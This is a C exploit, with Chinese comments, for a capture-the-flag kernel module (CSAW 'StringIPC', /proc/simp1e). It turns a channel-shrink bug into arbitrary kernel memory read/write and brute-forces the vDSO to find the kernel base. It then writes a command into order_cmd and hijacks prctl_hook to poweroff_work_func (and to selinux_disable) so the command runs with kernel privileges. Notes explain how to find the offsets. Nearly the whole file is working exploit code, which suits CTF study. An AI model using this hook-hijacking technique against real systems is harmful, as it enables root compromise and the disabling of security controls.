    #include <stdio.h>
    #include <sys/prctl.h>       
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <string.h>
    #include <sys/auxv.h> 
    
    #define CSAW_IOCTL_BASE     0x77617363
    #define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
    #define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
    #define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
    #define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
    #define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
    #define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
    #define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
    #define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8
    
    
    struct alloc_channel_args {
        size_t buf_size;
        int id;
    };
    
    struct open_channel_args {
        int id;
    };
    
    struct shrink_channel_args {
        int id;
        size_t size;
    };
    
    struct read_channel_args {
        int id;
        char *buf;
        size_t count;
    };
    
    struct write_channel_args {
        int id;
        char *buf;
        size_t count;
    };
    
    struct seek_channel_args {
        int id;
        loff_t index;
        int whence;
    };
    
    struct close_channel_args {
        int id;
    };
    
    //放置shellcode
    int check_vsdo_shellcode(char *shellcode){
        size_t addr=0;
        addr = getauxval(AT_SYSINFO_EHDR);
        printf("vdso:%lx\n", addr);
        if(addr<0){
            puts("[-]cannot get vdso addr");
            return 0;
        }   
        if (memmem((char *)addr,0x1000,shellcode,strlen(shellcode) )){
            return 1;
        }
        return 0;
    }
    
    int main(){
        int fd = -1;
        size_t result = 0;
        struct alloc_channel_args alloc_args;
        struct shrink_channel_args shrink_args;
        struct seek_channel_args seek_args;
        struct read_channel_args read_args;
        struct write_channel_args write_args;
        size_t addr = 0xffffffff80000000;
        size_t kernel_base = 0 ;
        size_t selinux_disable_addr= 0x2C7BA0;     //后面讲到如何获取这些函数和全局变量的固定偏移地址
        size_t prctl_hook = 0x124FD00;
        size_t order_cmd = 0x123D1E0;
        size_t poweroff_work_func_addr =0x9C4C0;
        setvbuf(stdout, 0LL, 2, 0LL);
        char *buf = malloc(0x1000);
    
        fd = open("/proc/simp1e",O_RDWR);
        if(fd < 0){
            puts("[-] open error");
            exit(-1);
        }
    
        //1.先创建一个channel，名为alloc_args
        alloc_args.buf_size = 0x100;
        alloc_args.id = -1;
        ioctl(fd,CSAW_ALLOC_CHANNEL,&alloc_args);
        if (alloc_args.id == -1){
            puts("[-] alloc_channel error");
            exit(-1);
        }
        printf("[+] now we get a channel %d\n",alloc_args.id);
    
        //2.修改alloc_args的size为0xffffffff ffffffff  造任意地址读写
        shrink_args.id = alloc_args.id;
        shrink_args.size = 0x100+1;
        ioctl(fd,CSAW_SHRINK_CHANNEL,&shrink_args);
        puts("[+] we can read and write any momery");
    
        //3.爆破读取VSDO地址，只要该页在偏移0x2cd处的字符串是"gettimeofday"，则找到了VDSO
        // $ dump memory ./vdso.dump 0xffff...  0xffff...
        // $ strings -a -t x ./vdso.dump | grep gettimeofday
        //    2c6 __vdso_gettimeofday
        for(;addr<0xffffffffffffefff;addr+=0x1000){
            //SEEK设置从哪个偏移读起
            seek_args.id =  alloc_args.id;
            seek_args.index = addr-0x10 ;
            seek_args.whence= SEEK_SET;
            ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
            //读取该页(0x1000)的内容
            read_args.id = alloc_args.id;
            read_args.buf = buf;
            read_args.count = 0x1000;
            ioctl(fd,CSAW_READ_CHANNEL,&read_args);
            if(( !strcmp("gettimeofday",buf+0x2cd)) ){ // ((*(size_t *)(buf) == 0x00010102464c457f)) && 
                result = addr;
                printf("[+] found vdso %lx\n",result);
                break;
            }
        }
        //scanf("%d",&cred);
        //printf("");
        if(result == 0){
            puts("not found , try again ");
            exit(-1);
        }
        //4.根据VDSO地址获取kernel base基址，以及其他函数地址
        kernel_base = addr-0x1020000;
        selinux_disable_addr+= kernel_base;
        prctl_hook += kernel_base;
        order_cmd += kernel_base;
        poweroff_work_func_addr += kernel_base;
        //size_t argv_0 = kernel_base + 0x117ed20;
        //size_t mce_do_trigger_addr = kernel_base + 0x0422ba;
        //size_t env = kernel_base + 0xe4df20;
        printf("[+] found kernel base: %lx\n",kernel_base);
        printf("[+] found prctl_hook: %lx\n",prctl_hook);
        printf("[+] found order_cmd : %lx\n",order_cmd);
        printf("[+] found selinux_disable_addr : %lx\n",selinux_disable_addr);  
        printf("[+] found poweroff_work_func_addr: %lx\n",poweroff_work_func_addr);
    
        getchar();
        
        //5.把待执行的命令写入order_cmd
        memset(buf,'\0',0x1000);
        //*(size_t *)buf = selinux_disable_addr;
        strcpy(buf,"/bin/chmod 777 /flag\0");
        seek_args.id =  alloc_args.id;
        seek_args.index = order_cmd-0x10 ;    // 减去0x10是因为最开始krealloc返回值是0x10，写入地址是(channel->data+channel->index)
        seek_args.whence= SEEK_SET; 
        ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
        write_args.id = alloc_args.id;
        write_args.buf = buf;//&cat_flag;
        write_args.count = strlen(buf);
        ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);
        memset(buf,'\0',0x1000);
        seek_args.id =  alloc_args.id;
        seek_args.index = order_cmd+20-0x10 ;
        seek_args.whence= SEEK_SET; 
        ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
        write_args.id = alloc_args.id;
        write_args.buf = buf;//&cat_flag;
        write_args.count = 1;
        ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);    // 再写入1字节的'\x00'
    //  change *prctl_hook -> selinux_disable_addr
        //6.劫持prctl_hook -> selinux_disable_addr，使得selinux失效
        memset(buf,'\0',0x1000);
        *(size_t *)buf = selinux_disable_addr;
        //strcpy(buf,"/bin//sh\0");
        seek_args.id =  alloc_args.id;
        seek_args.index = prctl_hook-0x10 ;
        seek_args.whence= SEEK_SET; 
        ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
        write_args.id = alloc_args.id;
        write_args.buf = buf;//&cat_flag;
        write_args.count = strlen(buf)+1;
        ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);   
        //prctl(addr,2, addr,addr,2);                 #居然没有执行prctl，也就是说没有使selinux失效，所以不需要这一步
    
        //7. 劫持prctl_hook ->  poweroff_work_func_addr   最终调用prctl执行我们的命令"/bin/chmod 777 /flag\0"
        memset(buf,'\0',0x1000);
        *(size_t *)buf = poweroff_work_func_addr;
        seek_args.id =  alloc_args.id;
        seek_args.index = prctl_hook-0x10 ;
        seek_args.whence= SEEK_SET; 
        ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
        write_args.id = alloc_args.id;
        write_args.buf = buf;//&cat_flag;
        write_args.count = strlen(buf)+1;
        ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);   
    
    // change order_cmd -> "cat /flag\0"
        prctl(addr,2, addr,addr,2);
    
        return 0;
    }
    /*
    (1) 如何获取关键系统函数和全局变量的偏移地址
        VDSO地址获取: $ cat /proc/kallsyms | grep vdso       #0xffffffffa0620000     -    0xffffffff9f600000  =  0x1020000
            但高版本系统不能获取VDSO基址，只能代码爆破了。
        kernel base: $ cat /proc/kallsyms                   #0xffffffff9f600000
            第一个地址，同一内核中VDSO和kernel base地址间隔不变。
        其他函数地址:  $ cat /proc/kallsyms | grep xxx
            ffffffff9f8c7ba0 T selinux_disable
            ffffffff9f69c4c0 t poweroff_work_func
            prctl_hook和order_cmd怎么获取呢？
                (1)prctl_hook                               #0xffffffffa084fd00     -    0xffffffff9f600000  =  0x124FD00
                $ cat /proc/kallsyms | grep security_task_prctl
                  ffffffff9f8bd410 T security_task_prctl     0xffffffffa0d62100+0x18
                gdb-$ x /30iw 0xffffffff9f8bd410
                       0xffffffff9f8bd454:  call   QWORD PTR [rbx+0x18]
                       rbx+0x18 == 0xffffffffa084fd00
                所以prctl_hook = 0xffffffffa084fd00
                (2)order_cmd                                #0xffffffffa083d1e0     -    0xffffffff9f600000  =  0x123D1E0
                $ cat /proc/kallsyms | grep poweroff_work_func
                  ffffffff9f69c4c0 t poweroff_work_func
                gdb-$ x /30iw ffffffff9f69c4c0
                    第一个call就是调用 run_cmd,查看rdi==0xffffffffa083d1e0
                       0xffffffff9f69c4c0:  push   rbx
                       0xffffffff9f69c4c1:  mov    rdi,0xffffffffa083d1e0
                       0xffffffff9f69c4c8:  movzx  ebx,BYTE PTR [rip+0x1670401]        # 0xffffffffa0d0c8d0
                       0xffffffff9f69c4cf:  call   0xffffffff9f69c050
    */
